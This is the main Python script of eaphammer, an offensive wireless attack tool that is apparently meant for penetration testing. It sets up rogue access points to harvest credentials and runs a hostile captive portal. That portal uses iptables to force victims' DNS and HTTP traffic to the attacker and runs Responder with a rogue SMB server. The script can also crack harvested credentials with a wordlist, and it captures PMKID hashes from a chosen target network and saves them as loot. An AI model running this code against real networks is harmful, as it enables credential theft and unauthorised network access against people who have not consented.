#!/usr/bin/env python

import argparse
import core.cli
import datetime
import json
import os
import signal
import subprocess
import sys
import time

from argparse import ArgumentParser
from core import cert_manager, conf_manager, utils, responder, services
from core.autocrack import Autocrack
from core import iw_parse
from core.hostapd import HostapdEaphammer
from core.hostapd_config import HostapdConfig
from core.servers.redirect_server import RedirectServer
from datetime import datetime
from settings import settings, __version__


def cert_wizard():

    while True:

        print ('[*] Please enter two letter country '
                            'code for certs (i.e. US, FR)')

        country = raw_input(': ').upper()
        if len(country) == 2:
            break
        print '[!] Invalid input.'

    print ('[*] Please enter state or province for '
                        'certs (i.e. Ontario, New Jersey)')
    state = raw_input(': ')

    print '[*] Please enter locale for certs (i.e. London, Hong Kong)'
    locale = raw_input(': ')

    print '[*] Please enter organization for certs (i.e. Evil Corp)'
    org = raw_input(': ')

    print '[*] Please enter email for certs (i.e. cyberz@h4x0r.lulz)'
    email = raw_input(': ')

    print '[*] Please enter common name (CN) for certs.'
    cn = raw_input(': ')

    cert_manager.ca_cnf.configure(country, state, locale, org, email, cn)
    cert_manager.server_cnf.configure(country, state, locale, org, email, cn)
    cert_manager.client_cnf.configure(country, state, locale, org, email, cn)

    cert_manager.bootstrap()

def hostile_portal():
    global responder

    use_autocrack = options['autocrack']
    wordlist = options['wordlist']
    interface = core.interface.Interface(options['interface'])
    use_pivot = options['pivot']
    save_config = options['save_config']

    try:
        utils.Iptables.save_rules()
    
        # start autocrack if enabled
        if use_autocrack:

            autocrack = Autocrack.get_instance()
            autocrack.configure(wordlist=wordlist)
            autocrack.start()
            time.sleep(4)

        # prepare environment
        interface.nm_off()
        utils.set_ipforward(1)

        # write hostapd config file to tmp directory
        hostapd_conf = HostapdConfig(settings, options)
        hostapd_conf.write()

        # start hostapd
        hostapd = HostapdEaphammer(settings, options)
        hostapd.start()

        # configure routing 
        interface.set_ip_and_netmask('10.0.0.1', '255.255.255.0')
        os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')

        # configure dnsmasq
        conf_manager.dnsmasq_captive_portal_cnf.configure(interface=str(interface))
        services.Dnsmasq.hardstart('-C %s 2>&1' % settings.dict['paths']['dnsmasq']['conf'])

        # start RedirectServer
        rs = RedirectServer.get_instance()
        rs.configure('10.0.0.1')
        rs.start()

        # start Responder
        if use_pivot:

            print '[*] Pivot mode activated. Rogue SMB server disabled.'
            print ('[*] Run payload_generator to '
                        'generate a timed payload if desired.')

            settings.dict['core']['responder']['Responder Core']['SMB'] = 'Off'

        else:

            settings.dict['core']['responder']['Responder Core']['SMB'] = 'On'

        resp = responder.Responder.get_instance()
        resp.configure(interface=str(interface))
        resp.start()

        # set iptables policy, flush all tables for good measure
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        # use iptables to redirect all DNS and HTTP(S) traffic to PHY
        utils.Iptables.route_dns2_addr('10.0.0.1', interface)
        utils.Iptables.route_http2_addr('10.0.0.1', interface)

        # pause execution until user quits
        raw_input('\n\nPress enter to quit...\n\n')

        hostapd.stop()
        services.Dnsmasq.kill()
        rs.stop()
        resp.stop()
        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()

        # restore iptables to a clean state (policy, flush tables)
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        utils.Iptables.restore_rules()

        # cleanly allow network manager to regain control of interface
        interface.nm_on()


    except KeyboardInterrupt:
    
        hostapd.stop()
        services.Dnsmasq.kill()
        rs.stop()
        resp.stop()
        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()
        
        # restore iptables to a clean state (policy, flush tables)
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        utils.Iptables.restore_rules()

        # cleanly allow network manager to regain control of interface
        interface.nm_on()

def captive_portal():

    interface = core.interface.Interface(options['interface'])
    use_autocrack = options['autocrack']
    wordlist = options['wordlist']
    save_config = options['save_config']

    try:

        utils.Iptables.save_rules()

        # prepare environment
        utils.set_ipforward(1)
        interface.nm_off()

        # start autocrack if enabled
        if use_autocrack:

            autocrack = Autocrack.get_instance()
            autocrack.configure(wordlist=wordlist)
            autocrack.start()

        # write hostapd config file to tmp directory
        hostapd_conf = HostapdConfig(settings, options)
        hostapd_conf.write()

        # start hostapd
        hostapd = HostapdEaphammer(settings, options)
        hostapd.start()

        # configure routing 
        interface.set_ip_and_netmask('10.0.0.1', '255.255.255.0')
        os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')

        # configure dnsmasq
        conf_manager.dnsmasq_captive_portal_cnf.configure(interface=str(interface))
        services.Dnsmasq.hardstart('-C %s 2>&1' % settings.dict['paths']['dnsmasq']['conf'])

        # start httpd
        services.Httpd.start()

        # set iptables policy, flush all tables for good measure
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        # use iptables to redirect all DNS and HTTP(S) traffic to PHY
        utils.Iptables.route_dns2_addr('10.0.0.1', interface)
        utils.Iptables.route_http2_addr('10.0.0.1', interface)
        
        # pause execution until user quits
        raw_input('\n\nPress enter to quit...\n\n')

        hostapd.stop()
        services.Dnsmasq.kill()
        services.Httpd.stop()
        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()
        
        # restore iptables to a clean state (policy, flush tables)
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        utils.Iptables.restore_rules()

        # cleanly allow network manager to regain control of interface
        interface.nm_on()

    except KeyboardInterrupt:

        hostapd.stop()
        services.Dnsmasq.kill()
        services.Httpd.stop()
        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()
        
        # restore iptables to a clean state (policy, flush tables)
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        utils.Iptables.restore_rules()

        # cleanly allow network manager to regain control of interface
        interface.nm_on()

def reap_creds():

    interface = core.interface.Interface(options['interface'])
    use_autocrack = options['autocrack']
    wordlist = options['wordlist']
    save_config = options['save_config']

    try:

        utils.Iptables.save_rules()

        # start autocrack if enabled
        if use_autocrack:

            autocrack = Autocrack.get_instance()
            autocrack.configure(wordlist=wordlist)
            autocrack.start()

        interface.nm_off()

        # write hostapd config file to tmp directory
        hostapd_conf = HostapdConfig(settings, options)
        hostapd_conf.write()

        # start hostapd
        hostapd = HostapdEaphammer(settings, options)
        hostapd.start()

        # pause execution until user quits  
        raw_input('\n\nPress enter to quit...\n\n')

        hostapd.stop()
        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()

        # cleanly allow network manager to regain control of interface
        interface.nm_on()

    except KeyboardInterrupt:

        hostapd.stop()
        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()

        # cleanly allow network manager to regain control of interface
        interface.nm_on()

def pmkid_attack():

    bssid = options['bssid']
    channel = options['channel']
    essid = options['essid']
    interface = core.interface.Interface(options['interface'])
    hcxpcaptool = settings.dict['paths']['hcxtools']['hcxpcaptool']['bin']
    hcxdumptool = settings.dict['paths']['hcxdumptool']['bin']
    hcxpcaptool_ofile = settings.dict['paths']['hcxtools']['hcxpcaptool']['ofile']
    hcxdumptool_ofile = settings.dict['paths']['hcxdumptool']['ofile']
    hcxdumptool_filter = settings.dict['paths']['hcxdumptool']['filter']
    loot_dir = settings.dict['paths']['directories']['loot']

    interface.down()
    interface.nm_off()
    interface.mode_managed()
    interface.up()

    print '[*] Scanning for nearby access points...'
    networks = iw_parse.iw_parse.get_interfaces(interface=str(interface))
    print '[*] Complete!'
    time.sleep(.5)

    interface.down()
    interface.mode_monitor()
    interface.up()

    if bssid is not None:

        if channel is None:
            print '[*] No channel specified... finding appropriate channel...'
            channel = iw_parse.helper_functions.find_channel_from_bssid(bssid, networks)
            if channel is None:
                print '[!] Target network not found... aborting...'
                sys.exit()
            print '[*] Channel %d selected...' % channel
            print '[*] Complete!'
        
        essid = iw_parse.helper_functions.find_essid_from_bssid(bssid, networks)
        if essid is None:
            print '[!] Target network is hidden...'
            essid = ''
    
    elif essid is not None:

        print '[*] No bssid or channel specified...'
        print '[*] ... searching for AP that has ESSID %s...' % essid
        bssid = iw_parse.helper_functions.find_bssid_from_essid(essid, networks)
        if bssid is None:
            print '[!] Target network not found... aborting...'
            sys.exit()
        print '[*] BSSID %s selected...' % bssid
        channel = iw_parse.helper_functions.find_channel_from_bssid(bssid, networks)
        if channel is None:
            print '[!] Target network not found... aborting...'
            sys.exit()
        print '[*] Channel %d selected...' % channel
        print '[*] Complete!'
    
    else:
        raise Exception('BSSID or ESSID must be specified')

    print '[*] Creating filter file for target...'
    with open(hcxdumptool_filter, 'w') as fd:
        fd.write('%s' % bssid.replace(':', ''))
    print '[*] Complete!'

    print '[*] Running hcxdumptool...'
    p = subprocess.Popen('%s -i %s -c %d -o %s --filtermode=2 --filterlist=%s --enable_status=3' % (hcxdumptool, interface, channel, hcxdumptool_ofile, hcxdumptool_filter), shell=True, stdout=subprocess.PIPE, preexec_fn=os.setsid)
    while True:
        line = p.stdout.readline()
        print line,
        if 'FOUND PMKID CLIENT-LESS]' in line:
            break
    os.killpg(os.getpgid(p.pid), signal.SIGTERM)
    print '[*] Complete!'

    print '[*] Extracting hash from pcap file using hcxpcaptool...'
    os.system('%s -z %s %s' % (hcxpcaptool, hcxpcaptool_ofile, hcxdumptool_ofile))
    with open(hcxpcaptool_ofile) as fd:
        hash_str = fd.read()
        print '\thashcat format:', hash_str
    print '[*] Complete!'

    save_file = os.path.join(loot_dir, '-'.join([
            essid,
            bssid,
            datetime.strftime(datetime.now(), '%Y-%m-%d-%H-%M-%S'),
            'PMKID.txt',
    ]))
    
    print '[*] Saving hash to %s' % save_file
    with open(save_file, 'w') as fd:
        fd.write(hash_str)
    print '[*] Complete!'

    print '[*] Removing temporary files...'
    try:
        os.remove(hcxpcaptool_ofile)
    except OSError as e:
        print "Error: %s - %s" % (e.filename, e.strerror)
    try:
        os.remove(hcxdumptool_filter)
    except OSError as e:
        print "Error: %s - %s" % (e.filename, e.strerror)
    try:
        os.remove(hcxdumptool_ofile)
    except OSError as e:
        print "Error: %s - %s" % (e.filename, e.strerror)
    print '[*] Complete!'

def save_config_only():

    hostapd_conf = HostapdConfig(settings, options)
    hostapd_conf.write()
    hostapd_conf.save()
    hostapd_conf.remove()

def print_banner():


    print '''
                     .__                                         
  ____ _____  ______ |  |__ _____    _____   _____   ___________ 
_/ __ \\\\__  \\ \\____ \\|  |  \\\\__  \\  /     \\ /     \\_/ __ \\_  __ \\
\\  ___/ / __ \\|  |_> >   Y  \\/ __ \\|  Y Y  \\  Y Y  \\  ___/|  | \\/
 \\___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\\___  >__|   
     \\/     \\/|__|        \\/     \\/      \\/      \\/     \\/       

                            "Unrelenting Force"

                                v%s
    ''' % (__version__)

if __name__ == '__main__':

    print_banner()

    options = core.cli.set_options()

    if options['debug']:
        print '[debug] Settings:'
        print json.dumps(settings.dict, indent=4, sort_keys=True)
        print '[debug] Options:'
        print json.dumps(options, indent=4, sort_keys=True)

    if options['cert_wizard']:
        cert_wizard()
    elif options['save_config_only']:
        save_config_only()        
    elif options['captive_portal']:
        captive_portal()
    elif options['hostile_portal']:
        hostile_portal()
    elif options['pmkid']:
        pmkid_attack()
    else:
        reap_creds()

